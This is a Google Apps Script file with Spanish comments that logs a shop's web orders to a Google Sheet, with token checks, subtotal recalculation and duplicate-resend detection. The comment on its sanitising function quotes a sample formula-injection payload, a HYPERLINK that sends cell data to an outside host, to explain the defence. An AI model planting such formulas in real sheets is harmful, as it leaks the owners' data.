/**
 * SONORO — Registro de pedidos
 *
 * Recibe los pedidos generados por el sitio y escribe una fila por pedido.
 *
 * Este archivo NO se ejecuta desde el repositorio: es la copia versionada de
 * lo que está pegado en el editor de Apps Script de la hoja «SONORO —
 * Pedidos». Si se edita allá, hay que traer el cambio acá, y al revés.
 *
 * INSTALACIÓN
 *   1. Hoja nueva en Google Sheets: «SONORO — Pedidos»
 *   2. Extensiones → Apps Script. Borra el contenido y pega este archivo.
 *   3. Ejecuta la función `configurar` UNA VEZ (menú desplegable → configurar → ▶).
 *      Autoriza los permisos que pida. Copia el token que imprime en el registro.
 *   4. Implementar → Nueva implementación → tipo «Aplicación web»
 *        Ejecutar como: Yo
 *        Quién tiene acceso: Cualquier persona
 *   5. Copia la URL y guárdala junto con el token en .env.local:
 *        QUOTE_LOG_URL=https://script.google.com/macros/s/.../exec
 *        QUOTE_LOG_TOKEN=<el token del paso 3>
 *
 * IMPORTANTE
 *   Cada vez que edites este archivo debes volver a implementar
 *   (Implementar → Administrar implementaciones → editar → Versión: Nueva).
 *   Guardar no basta: la URL sigue sirviendo la versión anterior.
 */

const HOJA = 'PEDIDOS';
const ZONA = 'America/Guatemala';

const ENCABEZADOS = [
  'Fecha',
  'Ref',
  'Unidades',
  'Subtotal (Q)',
  'Productos',
  'SKUs',
  'Origen',
];

/**
 * Columnas que llevan texto venido del cliente. Se formatean como TEXTO para
 * que la hoja no interprete nada de lo que llegue — ver `sanear`.
 * Fecha (1) y los números (3, 4) quedan fuera a propósito: se quieren como
 * fecha y como número, para ordenar y sumar.
 */
const COLUMNAS_DE_TEXTO = [2, 5, 6, 7];

/**
 * Topes de las celdas de texto. Iguales o mayores que los del sitio
 * (lib/quoteLog/types.ts: sku 64, nombre 200, texto 400, userAgent 400; si
 * cambian allá, cambian acá), y los de Productos y SKUs muy
 * por encima de un pedido real: hasta septiembre de 2026 Productos se cortaba
 * en 2,000 caracteres —unas 25 líneas— sin aviso, y Unidades y Subtotal
 * contaban productos que la celda ya no mostraba. Una celda de Sheets admite
 * 50,000 caracteres; si igual se llegara al tope, `cortar` lo dice.
 */
const MAX_SKU = 64;
const MAX_NOMBRE = 200;
const MAX_TEXTO = 400;
const MAX_USER_AGENT = 400;
const MAX_PRODUCTOS = 45000;
const MAX_SKUS = 20000;

/**
 * Ejecutar una sola vez, a mano, desde el editor.
 * Genera el token compartido y prepara la hoja.
 */
function configurar() {
  const props = PropertiesService.getScriptProperties();
  let token = props.getProperty('QUOTE_LOG_TOKEN');

  if (!token) {
    token = Utilities.getUuid().replace(/-/g, '');
    props.setProperty('QUOTE_LOG_TOKEN', token);
  }

  // La zona de la hoja decide cómo SE VE la columna Fecha. El instante que se
  // guarda ya es exacto, pero una hoja en otra zona mostraría la hora corrida.
  SpreadsheetApp.getActiveSpreadsheet().setSpreadsheetTimeZone(ZONA);

  obtenerHoja();

  Logger.log('QUOTE_LOG_TOKEN=' + token);
  Logger.log('Copia esa línea a tu .env.local y a las variables de entorno de Vercel.');
}

function obtenerHoja() {
  const libro = SpreadsheetApp.getActiveSpreadsheet();
  let hoja = libro.getSheetByName(HOJA);

  if (!hoja) {
    hoja = libro.insertSheet(HOJA);
  }

  if (hoja.getLastRow() === 0) {
    hoja.appendRow(ENCABEZADOS);
    const cabecera = hoja.getRange(1, 1, 1, ENCABEZADOS.length);
    cabecera.setFontWeight('bold');
    cabecera.setBackground('#0B0B0C');
    cabecera.setFontColor('#FFFFFF');
    hoja.setFrozenRows(1);
    hoja.setColumnWidth(1, 150); // Fecha
    hoja.setColumnWidth(2, 110); // Ref
    hoja.setColumnWidth(5, 380); // Productos
    hoja.setColumnWidth(6, 200); // SKUs
    hoja.setColumnWidth(7, 240); // Origen
    hoja.getRange('D:D').setNumberFormat('#,##0.00');
  }

  // La columna Fecha se ve como texto legible, en la zona de la hoja
  // (`configurar` la deja en ZONA). En cada llamada, igual que las de texto.
  hoja.getRange('A2:A').setNumberFormat('yyyy-mm-dd hh:mm:ss');

  // En cada llamada, no solo al crear la hoja: si alguien cambia el formato de
  // una de estas columnas a mano, la siguiente escritura lo repone. Es barato
  // y es la mitad de la defensa contra fórmulas (la otra mitad es `sanear`).
  for (let i = 0; i < COLUMNAS_DE_TEXTO.length; i++) {
    const letra = String.fromCharCode(64 + COLUMNAS_DE_TEXTO[i]);
    hoja.getRange(letra + '2:' + letra).setNumberFormat('@');
  }

  return hoja;
}

/**
 * Deja un valor como TEXTO PLANO, listo para una celda.
 *
 * En una hoja de cálculo, un valor que empieza con `=`, `+`, `-` o `@` no es
 * texto: se ejecuta. Y hay dos campos de esta fila que los controla por
 * completo quien manda la petición — `ref` y el navegador, que va a la
 * columna Origen. Un `=HYPERLINK("https://sitio-ajeno/?d="&A2,"ver")` ahí
 * convierte la hoja en un canal para sacar datos hacia afuera, y basta con
 * que alguien de la casa haga clic.
 *
 * El apóstrofo delante NO se ve en la celda: le dice a la hoja «esto es
 * texto». Va además del formato `@` de la columna, porque los dos fallan de
 * maneras distintas: el formato se puede cambiar a mano desde la hoja, y el
 * apóstrofo se pierde si alguien copia la celda y la pega como valor.
 */
function sanear(valor, maximo) {
  const texto = String(valor == null ? '' : valor).slice(0, maximo || 200);
  return /^[=+\-@\t\r]/.test(texto) ? "'" + texto : texto;
}

/**
 * Precio en el formato del sitio (CLAUDE.md regla 5): «Q 2,450.00», con coma
 * de miles, dos decimales y espacio duro, igual que formatQ en
 * lib/format/precio.ts. Apps Script no puede importar esa función: esta es
 * su copia, y solo la usa lo que la hoja arma por su cuenta.
 */
function formatoQ(cents) {
  const partes = (Math.round(Number(cents) || 0) / 100).toFixed(2).split('.');
  return 'Q ' + partes[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',') + '.' + partes[1];
}

/**
 * Une `partes` con `separador` sin pasar de `maximo` caracteres, cortando
 * entre partes y nunca a mitad de una. Si algo no entra, el final lo dice
 * («… y 3 más»): un pedido incompleto en la hoja tiene que verse incompleto,
 * no parecer entero.
 */
function cortar(partes, separador, maximo) {
  const texto = partes.join(separador);
  if (texto.length <= maximo) return texto;
  const entran = [];
  let largo = 0;
  for (let i = 0; i < partes.length; i++) {
    // Sin separador delante si todavía no entró nada: la celda no puede
    // empezar con una línea en blanco.
    const aviso = (entran.length ? separador : '') + '… y ' + (partes.length - i) + ' más';
    const suma = largo + (entran.length ? separador.length : 0) + partes[i].length;
    if (suma + aviso.length > maximo) {
      return entran.join(separador) + aviso;
    }
    entran.push(partes[i]);
    largo = suma;
  }
  return entran.join(separador);
}

/**
 * Minutos dentro de los cuales dos filas idénticas se consideran el MISMO
 * envío repetido y no dos pedidos.
 */
const VENTANA_REENVIO_MIN = 10;

/**
 * ¿Esto es un reenvío de algo que ya se escribió hace un momento?
 *
 * OJO CON EL REF. Desde el 24 de septiembre de 2026 sale del carrito ENTERO
 * —su fecha de creación MÁS su contenido (lib/whatsapp/ref.ts)—, y el carrito
 * se vacía al pedir, así que dos pedidos distintos ya no comparten Ref. Antes
 * salía solo de la fecha, y en esta hoja quedó SNR-S8CAM el 25 de agosto con
 * dos pedidos distintos; los Ref viejos pueden repetirse.
 *
 * Aun así NO alcanza con mirar el Ref: el mismo carrito pedido dos veces (el
 * cliente vuelve atrás y reenvía) da el mismo Ref para un pedido que puede
 * ser real. Se comparan Ref, unidades y subtotal, y solo dentro de los
 * últimos minutos:
 * lo que se quiere atrapar es el reintento de red del mismo envío, que llega
 * en segundos, no un pedido igual hecho otro día.
 */
function esReenvioReciente(hoja, ref, unidades, subtotal) {
  const ultima = hoja.getLastRow();
  if (ultima < 2) return false;

  // Con mirar las últimas filas basta: un reintento llega en segundos, así
  // que está al final. Evita leer la hoja entera en cada pedido.
  const desde = Math.max(2, ultima - 49);
  const filas = hoja.getRange(desde, 1, ultima - desde + 1, 4).getValues();
  const limite = Date.now() - VENTANA_REENVIO_MIN * 60 * 1000;

  for (let i = 0; i < filas.length; i++) {
    const fila = filas[i];
    if (String(fila[1]).trim() !== ref) continue;
    if (Number(fila[2]) !== Number(unidades)) continue;
    if (Number(fila[3]) !== Number(subtotal)) continue;
    // La columna Fecha vuelve como Date. Las filas escritas antes de septiembre
    // de 2026 pueden traer texto ('yyyy-MM-dd HH:mm:ss', interpretado en la zona
    // de la hoja): se entienden con new Date(...) igual, y como caducan en
    // minutos no importa que ese texto sea aproximado.
    const fecha = fila[0] instanceof Date ? fila[0] : new Date(String(fila[0]).replace(' ', 'T'));
    if (!isNaN(fecha.getTime()) && fecha.getTime() >= limite) return true;
  }
  return false;
}

function respuesta(ok, mensaje, extra) {
  const cuerpo = Object.assign({ ok: ok, mensaje: mensaje }, extra || {});
  return ContentService
    .createTextOutput(JSON.stringify(cuerpo))
    .setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return respuesta(false, 'Cuerpo vacío');
    }

    let datos;
    try {
      datos = JSON.parse(e.postData.contents);
    } catch (err) {
      return respuesta(false, 'JSON inválido');
    }

    // Token compartido. Sin esto, cualquiera que descubra la URL puede
    // escribir filas en la hoja.
    const esperado = PropertiesService.getScriptProperties().getProperty('QUOTE_LOG_TOKEN');
    if (!esperado) {
      return respuesta(false, 'Script sin configurar: ejecuta configurar() una vez');
    }
    if (datos.token !== esperado) {
      return respuesta(false, 'No autorizado');
    }

    const ref = String(datos.ref || '').slice(0, 40);
    if (!ref) {
      return respuesta(false, 'Falta ref');
    }

    const items = Array.isArray(datos.items) ? datos.items : [];
    if (items.length === 0) {
      return respuesta(false, 'Pedido sin líneas');
    }

    // Fecha: se usa la del servidor, no la que manda el cliente.
    // El reloj del navegador no es una fuente de verdad.
    //
    // Va como FECHA (Date) y no como texto formateado: un texto lo interpreta
    // la hoja en SU zona horaria, y si no era la de Guatemala el instante que
    // quedaba guardado se corría horas — esReenvioReciente() lo comparaba
    // contra Date.now() y dejaba pasar los reenvíos, o descartaba pedidos
    // legítimos. Un Date es un instante exacto en cualquier zona; la columna
    // solo le da el formato para mostrarlo.
    const fecha = new Date();

    let unidades = 0;
    const lineas = [];
    const skus = [];

    for (let i = 0; i < items.length; i++) {
      const it = items[i] || {};
      const sku = String(it.sku || '?').slice(0, MAX_SKU);
      const nombre = String(it.nombre || '').slice(0, MAX_NOMBRE);
      const qty = Number(it.qty) || 0;
      const cents = Number(it.unitPriceCents) || 0;
      // La línea la manda el sitio YA ARMADA en `texto`: es la misma del
      // mensaje de WhatsApp, así que la hoja y el vendedor leen el pedido
      // igual, y un cambio de formato no obliga a reimplementar este script.
      // Sin `texto` (una pestaña con el sitio anterior), se arma como antes,
      // con la marca de `estado` —hoy «bajo pedido»— y el precio en el
      // formato del sitio (Q 2,450.00).
      const texto = String(it.texto || '').slice(0, MAX_TEXTO);
      const estado = String(it.estado || '').slice(0, 40);
      const marca = estado ? ' · ' + estado : '';

      unidades += qty;
      skus.push(sku);
      lineas.push(texto || qty + 'x ' + sku + ' — ' + nombre + ' @ ' + formatoQ(cents) + marca);
    }

    // El subtotal se RECALCULA aquí en vez de confiar en el que manda el
    // cliente. Si no coincide, se registra la discrepancia en Origen.
    let subtotalCents = 0;
    for (let i = 0; i < items.length; i++) {
      const it = items[i] || {};
      subtotalCents += (Number(it.qty) || 0) * (Number(it.unitPriceCents) || 0);
    }

    const enviado = Number(datos.subtotalCents);
    let origen = String(datos.userAgent || '').slice(0, MAX_USER_AGENT);
    if (!isNaN(enviado) && enviado !== subtotalCents) {
      origen = '[subtotal recibido: ' + formatoQ(enviado) + '] ' + origen;
    }

    const fila = [
      fecha,
      sanear(ref, 40),
      unidades,
      subtotalCents / 100,
      sanear(cortar(lineas, '\n', MAX_PRODUCTOS), MAX_PRODUCTOS),
      sanear(cortar(skus, ', ', MAX_SKUS), MAX_SKUS),
      sanear(origen, MAX_USER_AGENT + 40),
    ];

    // Dos pedidos simultáneos pueden escribir en la misma fila si no se
    // serializa el acceso. El candado cubre también la comprobación de
    // repetidos: sin él, dos reenvíos del mismo pedido podrían leer los dos
    // que «no está» y escribirlo dos veces.
    const lock = LockService.getScriptLock();
    try {
      lock.waitLock(10000);
      const hoja = obtenerHoja();
      // El reenvío puede llegar dos veces si la red reintenta, y un pedido
      // contado doble ensucia justo los números por los que existe la hoja.
      if (esReenvioReciente(hoja, ref, unidades, subtotalCents / 100)) {
        return respuesta(true, 'Reenvío repetido, no se escribió', { ref: ref });
      }
      hoja.appendRow(fila);
    } finally {
      lock.releaseLock();
    }

    return respuesta(true, 'Registrado', { ref: ref });
  } catch (err) {
    // Nunca lanzar: el sitio no debe recibir un 500 por un fallo de registro.
    return respuesta(false, 'Error interno: ' + err);
  }
}

/**
 * Verificación rápida desde el navegador: abre la URL de la implementación
 * y debe responder que el servicio está activo.
 */
function doGet() {
  return respuesta(true, 'Servicio de registro de pedidos activo');
}
